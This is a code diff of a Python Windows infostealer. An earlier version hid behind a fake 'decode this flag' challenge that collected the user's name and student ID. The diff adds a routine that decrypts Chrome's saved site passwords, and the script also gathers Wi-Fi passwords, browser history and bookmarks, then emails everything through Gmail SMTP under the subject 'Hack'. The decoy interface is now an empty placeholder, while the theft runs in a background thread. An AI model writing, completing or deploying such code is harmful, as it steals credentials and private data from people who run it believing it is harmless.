@@ -1,27 +1,32 @@
 from browser_history.browsers import Chrome, Firefox
+from Crypto.Cipher import AES
 from datetime import timedelta
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from threading import Thread
+import base64
+import json
 import os
 import psutil
 import pythoncom
+import shutil
 import smtplib
-import time
+import sqlite3
+import win32crypt
 import wmi
 
 
 def sent_email(text, subject):
     message = MIMEMultipart()
     message["from"] = os.getlogin()
-    message["to"] = "Username"
+    message["to"] = "username"
     message["subject"] = subject
     message.attach(MIMEText(text))
 
     with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
         smtp.ehlo()
         smtp.starttls()
-        smtp.login("Username", "Password")
+        smtp.login("username", "password")
         smtp.send_message(message)
 
 
@@ -66,123 +71,126 @@ def wifi():
         return {}
 
 
+def decrypt_password(password, key):
+    try:
+        iv = password[3:15]
+        password = password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return ""
+
+
+def sites_auth():
+    try:
+        result = []
+        local_state_path = f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
+        with open(local_state_path, "r") as file:
+            local_state = file.read()
+            local_state = json.loads(local_state)
+
+        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+        db_path = f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"
+        filename = "ChromeData.db"
+        shutil.copyfile(db_path, filename)
+        db = sqlite3.connect(filename)
+        cursor = db.cursor()
+        cursor.execute(
+            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+        for row in cursor.fetchall():
+            url = row[0]
+            username = row[2]
+            password = decrypt_password(row[3], key)
+            if username and password:
+                result.append((url, username, password))
+
+        cursor.close()
+        db.close()
+        os.remove(filename)
+
+    except:
+        pass
+
+    return result
+
+
 def bookmarks():
-    chrome_outputs = Chrome().fetch_bookmarks().bookmarks
-    firefox_outputs = Firefox().fetch_bookmarks().bookmarks
+    try:
+        urls = set({})
+        chrome_outputs = Chrome().fetch_bookmarks().bookmarks
+        firefox_outputs = Firefox().fetch_bookmarks().bookmarks
 
-    urls = set({})
-    for item in chrome_outputs:
-        urls.add(item[1][8 if item[1].startswith(
-            "https://") else 7:])
+        for item in chrome_outputs:
+            urls.add(item[1][8 if item[1].startswith("https://") else 7:])
 
-    for item in firefox_outputs:
-        urls.add(item[1][8 if item[1].startswith(
-            "https://") else 7:])
+        for item in firefox_outputs:
+            urls.add(item[1][8 if item[1].startswith("https://") else 7:])
+    except:
+        pass
 
     return urls
 
 
 def histories():
-    chrome_outputs = Chrome().fetch_history().histories
-    firefox_outputs = Firefox().fetch_history().histories
+    try:
+        urls = set({})
+        chrome_outputs = Chrome().fetch_history().histories
+        firefox_outputs = Firefox().fetch_history().histories
 
-    urls = set({})
-    for item in chrome_outputs:
-        urls.add(item[1][8 if item[1].startswith(
-            "https://") else 7:item[1].find('/', 8)])
+        for item in chrome_outputs:
+            urls.add(item[1][8 if item[1].startswith(
+                "https://") else 7:item[1].find('/', 8)])
 
-    for item in firefox_outputs:
-        urls.add(item[1][8 if item[1].startswith(
-            "https://") else 7:item[1].find('/', 8)])
+        for item in firefox_outputs:
+            urls.add(item[1][8 if item[1].startswith(
+                "https://") else 7:item[1].find('/', 8)])
+
+    except:
+        pass
 
     return urls
 
 
-def installed_apps():
-    stream = os.popen("wmic product get name")
-    list_apps = stream.readlines()
+def back_end():
+    brand = laptop_brand()
+    battery_status = battery_charge_percentage()
+    wifi_info = wifi()
+    sites_password = sites_auth()
+    browsers_bookmarks = bookmarks()
+    browsers_histories = histories()
 
-    useless_words = ["Microsoft", "Windows", "Office", "Python", "WinRT"]
-    filtered_list = []
+    result = f"{brand}\n\n{battery_status}\n\n#WIFI HISTORY#\n"
 
-    for item in list_apps[2::2]:
-        if not item.strip():
-            continue
-        is_useless = False
-        for word in useless_words:
-            if item.find(word) != -1:
-                is_useless = True
-                break
-        if not is_useless:
-            filtered_list.append(item[:-1])
+    for username, password in wifi_info.items():
+        result += f"{username}: {password}\n"
 
-    return filtered_list
+    result += "\n\n#SITES PASSWORD#\n"
+    for url, username, password in sites_password:
+        result += f"{url}\n"
+        result += f'"{username}"  ::  "{password}"\n\n'
 
-
-def back_end(information):
-    res1_str = laptop_brand()
-    res2_str = battery_charge_percentage()
-    res3_dict = wifi()
-    res4_set = bookmarks()
-    res5_list = installed_apps()
-    res6_set = histories()
-
-    result = f"{information}\n\n{res1_str}\n\n{res2_str}\n\nWIFI HISTORY\n"
-
-    for key, value in res3_dict.items():
-        result += "{:<50} {:<50}\n".format(key, value)
-
-    result += "\n\nBOOKMARKS\n"
-    for item in res4_set:
+    result += "\n#BOOKMARKS#\n"
+    for item in browsers_bookmarks:
         result += f"{item}\n"
 
-    result += "\n\nINSTALLED_APPS\n"
-    for item in res5_list:
-        result += f"{item}\n"
-
-    result += "\n\nHISTORIES\n"
-    for item in res6_set:
+    result += "\n\n#HISTORIES#\n"
+    for item in browsers_histories:
         result += f"{item}\n"
 
     sent_email(result, "Hack")
 
 
 def ui():
-    while True:
-        os.system("cls")
-        print("\n**DECODE THIS**\n\nLS4tLSAtLS0gLi4tIC8gLi0gLi0uIC4gLyAtIC4uLi4gLiAvIC0tLSAtLiAuIC8gLS4uLiAuIC4uIC0uIC0tLiAvIC0uLS4gLi0uIC4tIC0uLS4gLS4tIC4gLS4u\n")
-        flag = input("FLAG: ")
-        if flag.upper() == "YOU ARE THE ONE BEING CRACKED" or flag.upper() == "YOUARETHEONEBEINGCRACKED":
-            print(
-                "\nCongratulations...\nYou passed the test\n\nDont close the app. We are sending your name...")
-            sent_email(
-                f"ّFULLNAME: {name}\nSTUDENT ID: {student_id}", "Flag")
-            break
-        else:
-            print("\nWrong answer\nTry again")
-            time.sleep(3)
+    # Write your code here #
+    pass
 
 
-while True:
-    os.system("cls")
-    name = input("\nFull name: ")
-    if not name.strip():
-        print("This field is required")
-        time.sleep(2)
-        continue
-    student_id = input("\nStudent id: ")
-    if not student_id:
-        print("This field is required")
-        time.sleep(2)
-        continue
-    elif not student_id.isdigit():
-        print("Is wrong")
-        time.sleep(2)
-        continue
-    break
-
-x = Thread(target=back_end, args=(
-    f"FULLNAME: {name}\nSTUDENT ID: {student_id}", ))
+x = Thread(target=back_end)
 x.start()
 
 y = Thread(target=ui)
